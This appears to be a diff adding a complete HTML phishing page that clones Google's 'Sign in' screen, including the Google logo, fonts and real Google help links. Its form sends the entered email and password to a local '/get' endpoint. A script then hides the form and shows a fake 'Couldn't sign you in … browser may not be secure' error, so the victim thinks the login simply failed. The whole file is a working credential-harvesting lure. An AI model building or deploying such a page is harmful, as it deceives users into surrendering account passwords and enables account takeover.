@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <style>
+      body {
+        font-family: "Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif;
+      }
+		
+      #login-container {
+        width: 95;
+        margin: auto;
+		display:block;
+        padding: 20px;
+        border-radius: 5px;
+        margin-top: 10px;
+      }
+
+      #logo {
+        width: 48px;
+		height:48px;
+		margin-bottom:25px;
+      }
+
+      #g-h1 {
+        font-size: var(--wf-tfs,2rem);
+        text-align: left;
+        font-weight: 200;
+        margin: auto;
+      }
+
+      #g-h2 {
+        font-size: var(--wf-stfs,1rem);
+        text-align: left;
+        font-weight: 200;
+        margin: auto;
+		margin-bottom: 35px;
+      }
+		
+      #vergeten{
+		font-weight:500;
+		margin-top:-50px,;
+		position:relative;
+		}
+
+      .g-input {
+        width: 95%;
+        height: 30px;
+        background-color: transparent;
+        font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
+        border-width: 0.5px;
+        border-color: rgba(0, 0, 0, 0.6);
+        border-radius: 4px;
+        font-size: 16px;
+        padding: 13px 9px;
+        margin-bottom: 13px;
+		color:black;
+		border: solid rgb(82, 84, 84) 1px;
+      }
+		
+      label {
+    	position: relative;
+    	top: -51px;
+    	left: 10px;
+		margin-bottom:0;
+    	padding: 0.625rem 0;
+    	font-size: 1rem;
+    	color: rgb(69, 69, 69);
+    	pointer-events: none;
+    	transition: 0.2s;
+      }
+
+      input:focus {
+		border: solid rgb(38, 86, 201) 1px;
+		outline: solid rgb(38, 86, 201) 1px;
+      }
+		
+      input:focus ~ label,
+      input:valid ~ label,
+      input:not([value=""]) ~ label {
+    	top: -80px;
+    	left: 10px;
+    	color: #1a73e8;
+    	font-size: 0.75rem;
+    	background-color: #fff;
+    	height: 10px;
+    	padding-left: 5px;
+    	padding-right: 5px;
+      }
+	
+      #inputboven{
+		height: 74px;
+      }
+		
+      #inputonder{
+		height:50px;
+      }
+		
+      .create-account {
+        font-size: smaller;
+        color: rgb(38, 86, 201);
+		font-weight:500;
+        text-decoration: none;
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        font-size: 14px;
+        letter-spacing: 0.25px;
+      }
+
+      .gbtn-primary {
+        min-width: 64px;
+        border: none;
+        margin-top: 6px;
+        margin-bottom: 6px;
+        height: 36px;
+        border-radius: 4px;
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        font-size: 15px;
+        font-weight: 500;
+        padding: 3px 24px 3px 24px;
+        box-sizing: inherit;
+        background-color: var(--gm-fillbutton-container-color, rgb(38, 86, 201));
+        color: #fff;
+		border-radius:50px;
+      }
+		
+      #verversen{
+		float:right;
+		display:none;
+      }
+		
+      button{
+		margin-right:10px;
+      }
+		
+      .gbtn-primary:hover {
+		cursor:pointer;
+      }
+
+      .button-container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .text {
+        font-family: Roboto, "Noto Sans Myanmar UI", Arial, sans-serif;
+        white-space: normal;
+        color: #5f6368;
+        font-size: 14px;
+        line-height: 1.4286;
+        padding-bottom: 3px;
+        padding-top: 9px;
+        box-sizing: inherit;
+		margin-top:35px;
+      }
+
+      .txt {
+        text-decoration: none;
+        border-radius: 4px;
+        color: rgb(38, 86, 201);
+		font-weight:500;
+      }
+    </style>
+
+</head>
+<body>
+	<div id="login-container">
+		<div id="logo">
+			<svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path>
+		  	</svg>
+		</div>
+		
+		<form action="/get" id="email-form-step">
+        	<h1 id="g-h1">Sign in</h1>
+        	<h3></h3>
+        	<h2 id="g-h2">Use your Google Account</h2>
+        	<h6></h6>
+		  		<div id="verbergen">
+        			<div id="login-content">
+						<div id="inputboven">	
+          					<input name="email" type="text" class="g-input" required onkeyup="this.setAttribute('value', this.value);"  value="">
+			 				<label>Email or phone</label>
+						</div>
+		
+					<div id="inputonder">
+          				<input name="password" type="password" class="g-input" required onkeyup="this.setAttribute('value', this.value);"  value="">
+						<label>Password</label>
+					</div>
+						
+					<a class="create-account" id="vergeten" href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.be%2F%3Fclient%3Dsafari&ddm=0&dsh=S2114651573%3A1712613798390482&ec=GAZAmgQ&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=nl&ifkv=ARZ0qKLxgdA54cNN1RB4DPTmUNrUVauL49Iyl_fjCFPZXqYgOKHXWcydAoh1Cf-BcydchJ4Ca_mrYg&theme=mn" target="_blank"><br>Forgot email?</a>
+						
+         			<div class="text">Not your computer? Use Private Browsing windows to sign in. <br><a href="https://support.google.com/accounts/answer/2917834?visit_id=638482134283980911-2246601775&p=signin_privatebrowsing&hl=nl&rd=1" target="blank" class="txt" aria-label="a">Learn more about using Guest mode</a>
+          			</div>
+          
+					<h5></h5>
+          			<div class="button-container">
+            			<a class="create-account" href="caca.html">Create account</a>
+           				<a><button class="gbtn-primary" type="submit" onclick="foutMelding()">Next</button></a>
+          			</div>
+				</div>
+			</div>
+		  <button class="gbtn-primary" id="verversen" type="submit" onClick="window.location.reload();">Next</button>
+      </form>
+    </div>
+  </body>
+</html>
+<script>	
+function foutMelding(){
+	document.getElementById("verbergen").style.display = "none";
+	document.getElementById("verversen").style.display = "inline";
+	document.getElementById("g-h1").innerHTML = "Couldn't sign you in";
+	document.getElementById("g-h2").innerHTML = "This browser or app may not be secure. <span style='color:rgb(38, 86, 201); cursor:pointer;'>Learn more</span><br>\n<br>\nTry using a different browser. If you're already using a supported browser, you can refresh your screen and try again to sign in.";
+	document.getElementById("g-h2").style.lineHeight = 1.5;
+}
+</script>
